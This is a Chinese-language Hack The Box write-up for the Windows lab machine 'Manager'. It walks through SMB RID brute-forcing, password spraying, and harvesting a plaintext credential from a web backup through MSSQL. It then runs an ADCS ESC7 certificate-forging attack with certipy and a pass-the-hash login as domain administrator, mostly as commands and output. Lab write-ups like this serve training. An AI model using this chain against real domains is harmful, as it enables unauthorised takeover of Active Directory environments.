---
layout: post
title: Manager - Windows | Hack The Box
category: [Hack The Box]
tags: [active directory pentesting, adcs, ecs7]
---

![Manager.png](https://raw.githubusercontent.com/h0ny/repo/main/images/dde591258cd2d2ee.png)

## Enumeration

### Nmap

```console
root@kali:~# nmap -sC -sV -O 10.129.4.179
Nmap scan report for manager.htb (10.129.4.179)
Host is up (0.53s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-22 18:38:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-22T18:39:52+00:00; +7h00m18s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-01-22T18:39:54+00:00; +7h00m19s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.4.179:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-01-22T18:34:45
|_Not valid after:  2054-02-23T18:34:45
|_ssl-date: 2024-01-22T18:39:53+00:00; +7h00m18s from scanner time.
| ms-sql-ntlm-info:
|   10.129.4.179:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-01-22T18:39:53+00:00; +7h00m19s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-22T18:39:53+00:00; +7h00m18s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m18s, deviation: 0s, median: 7h00m18s
| smb2-time:
|   date: 2024-01-22T18:39:12
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.92 seconds
```

添加域名解析：

```console
root@kali:~# echo "10.129.4.179 manager.htb" | sudo tee -a /etc/hosts
10.129.4.179 manager.htb
```

### SMB Anonymous Access

存在 SMB 匿名访问：

```console
root@kali:~# nxc smb manager.htb -u anonymous -p '' --shares
SMB         manager.htb  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb  445    DC01             [+] manager.htb\anonymous:
SMB         manager.htb  445    DC01             [*] Enumerated shares
SMB         manager.htb  445    DC01             Share           Permissions     Remark
SMB         manager.htb  445    DC01             -----           -----------     ------
SMB         manager.htb  445    DC01             ADMIN$                          Remote Admin
SMB         manager.htb  445    DC01             C$                              Default share
SMB         manager.htb  445    DC01             IPC$            READ            Remote IPC
SMB         manager.htb  445    DC01             NETLOGON                        Logon server share
SMB         manager.htb  445    DC01             SYSVOL                          Logon server share

```

> Tips：在实际渗透中，也可以尝试 guest 用户和空用户名。

RID Bruteforcing：在 nxc/cme 中使用 `--rid-brute` 选项通过猜测每个资源标识符（RID）来枚举所有 AD 对象，包括用户和组，RID 是安全标识符（SID）的结束数字集。

```console
root@kali:~# nxc smb manager.htb -u anonymous -p '' --rid-brute 10000
SMB         manager.htb  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb  445    DC01             [+] manager.htb\anonymous:
SMB         manager.htb  445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb  445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         manager.htb  445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         manager.htb  445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         manager.htb  445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         manager.htb  445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         manager.htb  445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         manager.htb  445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         manager.htb  445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         manager.htb  445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         manager.htb  445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         manager.htb  445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         manager.htb  445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         manager.htb  445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb  445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         manager.htb  445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         manager.htb  445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         manager.htb  445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         manager.htb  445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         manager.htb  445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb  445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb  445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         manager.htb  445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         manager.htb  445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         manager.htb  445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         manager.htb  445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         manager.htb  445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         manager.htb  445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         manager.htb  445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         manager.htb  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         manager.htb  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         manager.htb  445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

## Foothold

### Brute Force

```console
root@kali:~# nxc smb manager.htb -u users.txt -p users.txt --no-brute --continue-on-success
SMB         manager.htb    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE
SMB         manager.htb    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE
SMB         manager.htb    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
SMB         manager.htb    445    DC01             [+] manager.htb\ravan:ravan
SMB         manager.htb    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE
SMB         manager.htb    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE
SMB         manager.htb    445    DC01             [+] manager.htb\operator:operator
```

获得了两个有效密码 operator:operator 和 ravan:ravan 但 smb 协议都不能执行命令。

### MSSQL

1433 端口开放，尝试使用登录到 mssql 数据库：

```console
root@kali:~# nxc mssql manager.htb -u users.txt -p users.txt --no-brute --continue-on-success
MSSQL       manager.htb    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       manager.htb    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       manager.htb    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       manager.htb    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       manager.htb    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'MANAGER\Guest'.
MSSQL       manager.htb    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       manager.htb    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       manager.htb    1433   DC01             [+] manager.htb\operator:operator
```

使用 impacket-mssqlclient 连接数据库，权限很低。但在 Web 目录中查找到网站备份文件：

```console
root@kali:~# impacket-mssqlclient operator:operator@manager.htb -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami
[-] ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (MANAGER\Operator  guest@master)> select is_srvrolemember('sysadmin')
-
0

SQL (MANAGER\Operator  guest@master)> select is_member('db_owner')
-
0

SQL (MANAGER\Operator  guest@master)> select is_srvrolemember('public')
-
1

SQL (MANAGER\Operator  guest@master)> SELECT CURRENT_USER;
-----
guest

SQL (MANAGER\Operator  guest@master)> SELECT SUSER_SNAME();
----------------
MANAGER\Operator

SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
subdirectory                      depth   file
-------------------------------   -----   ----
about.html                            1      1
contact.html                          1      1
css                                   1      0
images                                1      0
index.html                            1      1
js                                    1      0
service.html                          1      1
web.config                            1      1
website-backup-27-07-23-old.zip       1      1
SQL (MANAGER\Operator  guest@master)>
```

下载 website-backup-27-07-23-old.zip 文件，解压后查看 web.config 配置：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>

```

获取到有效用户凭据：

```console
root@kali:~# nxc winrm manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
WINRM       manager.htb  5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
WINRM       manager.htb  5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

## Privilege Escalation

### ADCS - ESC7

使用 raven 域用户凭据，检测可以利用的证书模板：

```console
root@kali:~# certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.4.179 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates

```

ADCS - ESC7 利用步骤：

```console
root@kali:~# certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.4.179
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

root@kali:~# certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -dc-ip 10.129.4.179
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 14
Would you like to save the private key? (y/N) y
[*] Saved private key to 14.key
[-] Failed to request certificate

root@kali:~# certipy ca -ca 'manager-DC01-CA' -issue-request 14 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.4.179
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate

root@kali:~# certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target dc01.manager.htb -retrieve 14 -dc-ip 10.129.4.179
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 14
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '14.key'
[*] Saved certificate and private key to 'administrator.pfx'

root@kali:~# certipy auth -pfx administrator.pfx -dc-ip 10.129.4.179
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

root@kali:~# sudo ntpdate -u manager.htb

root@kali:~# certipy auth -pfx administrator.pfx -dc-ip 10.129.4.179
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

当出现 `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` 错误，表示需要向域控同步时间。

Windows 向域控制器同步时间的方法：

- 开启 w32time 服务：`sc start w32time`
- 同步时间：`w32tm /config /manualpeerlist:"dc01.manager.htb" /syncfromflags:manual /reliable:YES /update`

PTH 获取 root flag：

```console
root@kali:~# impacket-wmiexec manager.htb/administrator@dc01.manager.htb -hashes :ae5064c2f62317332c88629e025924ef -codec GBK -shell-type powershell
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> whoami
manager\administrator

PS C:\> type C:\Users\Administrator\Desktop\root.txt
27105e290ffb0fa6bdbe0c1663b32bd9
```
